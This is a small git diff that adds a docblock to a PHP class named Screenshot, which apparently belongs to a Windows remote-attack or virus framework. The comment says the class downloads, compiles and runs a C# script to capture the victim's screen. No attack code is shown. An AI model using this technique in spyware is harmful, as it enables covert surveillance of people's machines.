@@ -5,6 +5,14 @@ namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
 
+/**
+ * Class Screenshot. Takes a screenshot. This is done by downloading a C# script, compile it, then run it to get the screenshot. If the binary is already there then reuse that.
+ *
+ * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
+ * @author Quang Ho <157239q@gmail.com>
+ * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
+ * @license http://www.opensource.org/licenses/mit-license.html  MIT License
+ */
 class Screenshot extends AttackBase {
 
     protected function setState(string $json): void {
